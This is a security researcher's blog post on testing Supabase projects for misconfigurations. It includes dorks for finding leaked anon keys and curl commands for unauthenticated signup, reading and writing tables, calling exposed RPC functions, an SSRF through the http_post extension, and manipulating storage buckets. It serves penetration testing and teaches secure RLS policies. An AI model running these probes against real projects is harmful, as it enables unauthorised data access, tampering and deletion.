+++
title = "A Hands-On Edition: Will Supabase Be the Next Firebase (At Least in Terms of Security)?"
date = "2025-10-07"
[ author ]
  name = "m1tz"
+++

# A Hands-On Edition: Will Supabase Be the Next Firebase (At Least in Terms of Security)?
It all started with my good colleague *@schniggie* who's got my attention with an [X post](https://x.com/schniggie/status/1952837729462718581/photo/1) earlier that year. Until then I rarely heared of Supabase, but let us start from the scratch.

Firebase changed the way developers think about backend infrastructure: auth, database, storage, and functions - all *serverless* and tied together with a simple SDK. But over the last few years, Supabase has been gaining momentum as an open-source, Postgres-based alternative.

If Firebase is “NoSQL with rules,” Supabase is *Postgres with policies.* But just like Firebase, Supabase comes with sharp edges: insecure defaults, confusing policy systems, and common misconfigurations that can leave entire databases exposed to the internet.

In this post we will cover Supabase’s history and give a concise overview of how it works. As many existing blogs were already covering a solid knowledge of Supabase and how to test (especially the great blog post by [pentestly.io](https://www.pentestly.io/blog/supabase-security-best-practices-2025-guide)), this blog post takes a different approach by focusing on hands-on examples and especially where to find these vulnerable instances. This is paired with an resulting *Proof of Concept* script [SupaProbe](https://github.com/m-1tZ/SupaProbe) that helps to automate probing/exploitation from an unauthenticated attacker's point of view.

# History

Supabase launched in 2020 with the pitch: [*The open source Firebase alternative.*](https://supabase.com/blog/supabase-how-we-launch). Instead of building on proprietary infra, Supabase wraps around PostgreSQL with APIs for:
- Database - Auto-generated REST & GraphQL APIs on top of Postgres.
- Auth - User management with JWTs, signup, login, OAuth.
- Storage - S3-compatible object storage with RLS.
- Edge Functions - Serverless functions running on Deno.


# How Supabase Works
When you create a project, Supabase gives you:
- An anon key (JWT with role anon)
- A `service_role` key (JWT with role `service_role`)
- Optional publishable keys
- A `*.supabase.co` domain like `https://<id>.supabase.co/`

Supabase uses different types of keys and tokens to manage the app and users accessing resources. The following table gives a brief overview of different types:


| Key Type | Who Uses It | Purpose | Row-Level Security (RLS) | Access Scope | Expires? | Safe for Frontend? |
|-----------|--------------|----------|---------------------------|---------------|-----------|--------------------|
| anon key | Public app / unauthenticated users | Used by frontend apps to interact with Supabase before login or for public data | ✅ Enforced | Limited (public-level only) | ❌ No | ✅ Yes |
| Authenticated User Token | Individual signed-in user | Issued automatically when a user logs in; identifies the specific user | ✅ Enforced | User-specific, filtered by `auth.uid()` | ✅ Yes | ✅ Yes |
| `service_role` Key | Backend services, serverless functions, admin tools | Full-access key that bypasses RLS for trusted environments | ❌ Ignored | Full database access | ❌ No | 🚫 No |

So to summarize:
- **anon key:** Use for public or unauthenticated frontend operations  
- **Authenticated user tokens:** Use for logged-in users accessing their own data  
- **`service_role` key:** Use only on the backend for full administrative access

A anon key looks like:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
{
"iss": "supabase",
"ref": "abcdefghijlcxiggchfwe",
"role": "anon",
"iat": 1755366325,
"exp": 2070942325
}
```

Every request against the API uses either solely the anon key or the anon key combinded with a user’s JWT token. The database layer is protected with Row Level Security (*RLS*). *RLS* is enabled by default, but once enabled you must explicitly create policies for each table, which is not the easiest thing in life. *RLS* is explained in more details in the sections below.

# Where to Find Supabase
Supabase projects are easy to spot. Meanwhile, 410.000+ (at the time of writing) projects are registed and reachable via subdomains under its parent `supabase.co`. There is also a way to self-host Supabase see [here](https://supabase.com/docs/guides/self-hosting).

**Domains**
- `*.supabase.co` -> main API endpoint
- `*.storage.supabase.co` -> storage endpoint

## Via HTTP Request
The nuclei template from below helps us in doing so:
```yaml
id: supabase-detect

info:
  name: supabase detect
  author: m1tz
  severity: low
  reference:
    - https://x.com/schniggie/status/1952837729462718581/photo/1
    - https://www.precursorsecurity.com/security-blog/row-level-recklessness-testing-supabase-security
  tags: detect

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: word
        condition: or
        words:
          - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6I"
          - "@supabase/supabase-js"
          - ".supabase.co"
          - "process.env.SUPABASE_KEY"
        part: body
```

**Codebases**

Usually the following code snippet is used in different Javascript files. However, to be sure, map keywords such as `supabase-js` or just `supabase.co`:
```js
import { createClient } from '@supabase/supabase-js'
const supabase = createClient('https://xxx.supabase.co
```

Supabase mirrors Firebase’s appeal to mobile developers because it bundles the same set of client-first building blocks into a single, easy-to-use platform: client SDKs that run on mobile platforms, managed authentication with social and email flows, a hosted database you can query directly from the client, realtime subscriptions for live updates, and object storage for media. That combination means you can build full-featured apps without provisioning servers:
- Auth and access control are handled for you,
- realtime events keep UIs in sync,
- the SDKs simplify token handling, and
- reconnection and background-friendly patterns. 

Mobile assets usually store these either in `res/values/strings.xml` (Android) or in other custom source files. Sometimes you can find them hardcoded in source code.

## Some Dorking
A fair amount of *OSINT* is required to identify projects and their anon keys. These keys are often embedded in source code or configuration files, which makes GitHub a natural first stop. What should you look for? JWTs (whether anon or `service_role`) share the same JWT header and the same first 33 characters of the payload. Example decoded JWT up to `ref":"`:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6I
{
  "alg": "HS256",
  "typ": "JWT"
}.
{
  "iss": "supabase",
  "ref": "
```

We can leverage this predictable structure to craft searches across platforms and environments.

**GitHub Leaks**
- Search for `supabase.co` or `sb_publishable_` keys
- Mobile assets (Android) `"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsI"  path:/.*\.xml/`
- Classic web `"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsI"  path:/.*\.ts/`

**Sourcegraph**
- Via [Sourcegraph Search](https://sourcegraph.com/search) `https://sourcegraph.com/search?q=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsIn&patternType=keyword&sm=0&__cc=1`

**Cracking the Mapping**
You might be wondering: how do I map Supabase project IDs like *abcdefghijlcxiggchfwe* to my target application? You are right, cracking the mapping is a hard part. Once identified, security testing is rather a less tedious thing.


# Common Misconfigurations

## Authentication
Like Firebase, Supabase ships with defaults that make life easier for developers and easier for attackers. Self-signup is enabled by default and poses a high severity risk to applications that are auth-gated or invite-only. This means anyone can create an account unless disabled. A simple signup looks like:

```bash
$ curl -X POST 'https://<id>.supabase.co/auth/v1/signup'
-H "apikey: <anon_key>"
-d '{"email": "someone@email.com", "password": "somepassword"}'
```

**Note**: With a user in hand, the attack surface is usually expanded significantly!


## Row Level Security
Row Level Security (*RLS*) is a powerful concept in Supabase that lets you control exactly what a user can read or write. However, using *RLS* requires carefully setting up grants and policies, which can quickly become complex and prone to misconfiguration. On the other hand, if *RLS* is disabled, the opposite risk arises: any authenticated, or even anonymous user may be able to query or modify every row in a table. Find below an example of a custom policies and how to query them for the table `users`:

```bash
$ curl 'https://<id>.supabase.co/rest/v1/users?select=*'
-H "apikey: <anon_key>"
```

Even with *RLS* on, **bad** policies can expose entire tables, for example:
```
alter table chat_messages enable row level security;

create policy "view_all"
  on chat_messages
  for select
    to authenticated
    USING (
      true
    );
```

A **good** policy looks like:
```
alter table chat_messages enable row level security;

create policy "Allow users to access their own messages"
  on chat_messages for all
  using (auth.uid() = user_id);
```

## Database
Exposed schemas are directly accessible, and in the case of public schemas, their contents can be read by anyone. By default the *Data API* exposes the schemas `public` and `graphql_public`, of which the latter refers to [PostgreSQL views](https://neon.com/postgresql/postgresql-views), which are essentially named queries stored in the database. In addition, any stored functions exposed from the database can also be enumerated and queried.

**Get open schema**, load and convert it at [editor.swagger.io](https://editor.swagger.io/)
```bash
$ curl 'https://<id>.supabase.co/rest/v1/' -H "apikey: <anon_key>"

{"swagger":"2.0","info":{"description":"","title":"standard public schema","version":"13.0.4"},
[...]              
```

**List tables** with the following command:
```bash
$ curl 'https://<id>.supabase.co/rest/v1/test?select=*' -H "apikey: <anon_key>"
```

**Write tables** with:
```bash
$ curl 'https://<id>.supabase.co/rest/v1/test' -H "apikey: <anon_key>"
-H "Content-Type: application/json" \
-H "Prefer: return=minimal" \
-d '{ "some_column": "someValue" }'
```

When writing to tables, the HTTP POST request must include the exact set of required columns. If a column is missing, the API responds with an error such as:
```json
{"code":"PGRST204","details":null,"hint":null,"message":"Could not find the 'some_column' column of '<table>' in the schema cache"}
```

This error indicates that the target table is likely writable.

## Database Functions
*Database Functions* can be seen as stored procedures. By default, schemas are publicly exposed, making it easier to discover which functions exist and are callable through the *Data API*. Any function with an `EXECUTE` grant, automatically becomes accessible as an HTTP endpoint at `/rest/v1/rpc/<function>`. This applies not only to core business logic, but also to utility or helper functions, some of which may have been intended for internal use only. Exposing these can introduce risks. For example, helper functions that use HTTP extensions may be vulnerable to Server-Side Request Forgery (*SSRF*) if not carefully restricted. *Database Functions* could be called in the following way:

```bash
$ curl 'https://<id>.supabase.co/rest/v1/rpc/<function>' -H "apikey: <anon_key>"
```

**Secret Vault**
Stored procedures in Supabase can interact with the Vault. If these procedures are exposed to unauthorized users, attackers may be able to retrieve secrets directly or trigger procedure execution using the authenticated session context, leading to secret leakage, privilege escalation, or unauthorized actions.

## Extensions
Extensions add extra functionality to Supabase, but they also expand the attack surface by introducing powerful built-in gadgets. By default, they reside in their own schema, `extensions`, but this schema can be exposed through the `public` schema or even made publicly accessible itself at `extensions`.

Extensions worth to check whether exposed:
- `http` *HTTP Client* (disabled by default)
- `pg_net` *Database Webhooks* (disabled by default)

If so, these RPC endpoints are accessible:
```
http
http_put
http_post
http_delete
http_header
http_head
http_get
http_patch
http_list_curlopt
http_set_curlopt
http_reset_curlopt
urlencode
text_to_bytea
bytea_to_text
```

Especially the `http*` endpoints are of interest to attackers. The following example demonstrates a full read *SSRF* via HTTP POST:
```bash
$ curl 'https://<id>.supabase.co/rest/v1/rpc/http_post?uri=https://<domain>&content=<body>&content_type=<content-type>' -H "apikey: <anon_key>"

{"status":200,"content_type":"text/html; charset=utf-8","headers":[{"field":"Access-Control-Allow-Credentials","value":"true"},{"field":"Access-Control-Allow-Headers","value":"Content-Type, Authorization"},{"field":"Access-Control-Allow-Origin","value":"*"},{"field":"Content-Type","value":"text/html; charset=utf-8"},{"field":"Server","value":"<domain>"},{"field":"Date","value":"Sat, 04 Oct 2025 10:17:47 GMT"},{"field":"Content-Length","value":"72"},{"field":"Connection","value":"close"}],"content":"<html><head></head><body></body></html>"}
```

## Edge Functions
*Edge Functions* are server-side TypeScript functions, distributed globally at the edge, thus close to the users. They can be used for listening to webhooks or integrating your Supabase project with third-parties like Stripe. One major configuration pitfall exist in the *Function Configuration* page:

*Verify JWT with legacy secret* ... and is enabled by default.

When this option is enabled, every function call must include a JWT signed with the project’s legacy secret. The problem? Both the anon key and the `service_role` key are JWTs signed with that exact same secret. In other words, this setting does not add any real layer of access control - an easily obtainable anon key is enough to call your *Edge Functions*. Here's how the setting is described in the settings:

> Requires that a JWT signed only by the legacy JWT secret is present in the Authorization header. The easy to obtain anon key can be used to satisfy this requirement. Recommendation: OFF with JWT and additional authorization logic implemented inside your function's code.


Supabase *Edge Functions* default, allows calls with the anon key.

```bash
$ curl -X POST 'https://<id>.supabase.co/functions/v1/<function>'
-H "Authorization: Bearer <anon_key>"
-d '{"name":"test"}'
```

## Storage Buckets
A easy and rather non-complex component of Supabase. Each file represents a row, *RLS* is there to lock down access. There are mainly two bucket types, a private and a public bucket. Access to private buckets is controlled via *RLS* policies and public buckets effectively bypass this and allow read access to files via direct file URLs.


**The Bucket Oracle**
It can be difficult to enumerate storage buckets when the session lacks the necessary permissions to list them, even though the buckets themselves may still exist. Fortunately, many buckets follow predictable or common naming patterns, which means they can often be discovered through wordlist-based guessing when direct listing of buckets is not possible.


If appropriate *RLS* policies are in place, a accessible storage bucket looks like in the example below:
```bash
$ curl https://<id>.supabase.co/storage/v1/bucket/ -H "Authorization: Bearer <anon_key>"

[{"id":"test","name":"test","owner":"","public":true,"type":"STANDARD","file_size_limit":null,"allowed_mime_types":null,"created_at":"2025-08-16T21:05:10.637Z","updated_at":"2025-08-16T21:05:10.637Z"},{"id":"newbucket2","name":"newbucket2","owner":"","public":false,"type":"STANDARD","file_size_limit":null,"allowed_mime_types":null,"created_at":"2025-10-03T21:34:38.136Z","updated_at":"2025-10-03T21:34:38.136Z"}]
```
**Note:** In contrast this would result in a 200 with a empty `[]` response.

If configured (either public access or policies), files of buckets can be listed as well via the *Data API*. But it is not possible to differentiate between empty or not-accessible buckets solely from the response of this API (empty `[]` with HTTP status code 200). The next snippet desmonstrates a list of the files available in the specific bucket:

```bash
$ curl -X POST 'https://<id>.supabase.co/storage/v1/object/list/<bucket>' -H "Authorization: Bearer <anon_key>" -H "Content-Type: application/json" -d '{"prefix": "%", "limit": 100, "offset": 0, "sortBy": { "column": "name", "order": "asc" }}'
```

Sometimes you want to know whether buckets are public, this can be checked via the object API with a JSON `InvalidKey` error instead of a status code 403:
```bash
$ curl https://<id>.supabase.co/storage/v1/object/public/<bucket>/

{"statusCode":"400","error":"InvalidKey","message":"Invalid key: "}
```

And finally, the HTTP requests below illustrate the different operations that can be performed on storage buckets. Because Supabase supports fine-grained permissions, virtually every combination of misconfiguration is possible, which means we have to test each action independently:

```bash
# Upload
curl -i -X POST 'https://<id>.supabase.co/storage/v1/object/<bucket>/<file>' \
  -H "Authorization: Bearer <JWT>" \
  -H "Content-Type: text/plain" \
  --data 'hello world'

# Copy
curl -i -X POST 'https://<id>.supabase.co/storage/v1/object/copy' \
  -H "Authorization: Bearer <anon_key>" \
  -H "Content-Type: application/json" \
  -d '{"bucketId":"<bucket>","sourceKey":"<file>","destinationKey":"<file_copied>"}'

# Move
curl -i -X POST 'https://<id>.supabase.co/storage/v1/object/move' \
  -H "Authorization: Bearer <JWT>" \
  -H "Content-Type: application/json" \
  -d '{"bucketId":"<bucket>","sourceKey":"<file_copied>","destinationKey":"<file_moved>"}'

# Remove
curl -i -X DELETE 'https://<id>.supabase.co/storage/v1/object/<bucket>/<file>' \
  -H "Authorization: Bearer <JWT>"

# Access file
https://<id>.supabase.co/storage/v1/object/public/<bucket>/<file>
```

**Note:** Listing of files in buckets requires a *RLS* policy, even if it is a public bucket. 

# Conclusion
Supabase is powerful: real SQL, storage, and functions. But its security model is policy-heavy, and defaults (signup enabled, anon keys, *RLS*, exposed schemas, legacy JWT secret signing) make it easy to get wrong. As Supabase evolves rapidly, especially alongside the AI boom, it's crucial not to blindly trust available tooling. Always inspect the exposed schema, question what should be public, and assume new features may introduce new risks. What was safe yesterday might not be today. Much like Firebase in its early days, Supabase projects are popping up everywhere - often misconfigured and leaking data.

**So, will Supabase be the next Firebase? From a security researcher’s perspective - it already is!**


# References
- https://supabase.com/blog/supabase-how-we-launch
- https://supabase.com/docs/guides/database/postgres/row-level-security
- https://supabase.com/docs/guides/functions
- https://supabase.com/docs/guides/database/functions
- https://x.com/schniggie/status/1952837729462718581/photo/1
- https://www.precursorsecurity.com/security-blog/row-level-recklessness-testing-supabase-security
- https://deepstrike.io/blog/hacking-thousands-of-misconfigured-supabase-instances-at-scale
- https://www.wiz.io/blog/common-security-risks-in-vibe-coded-apps


**Again, special thanks** to [@TightropeMonkey](https://x.com/TightropeMonkey) for proofreading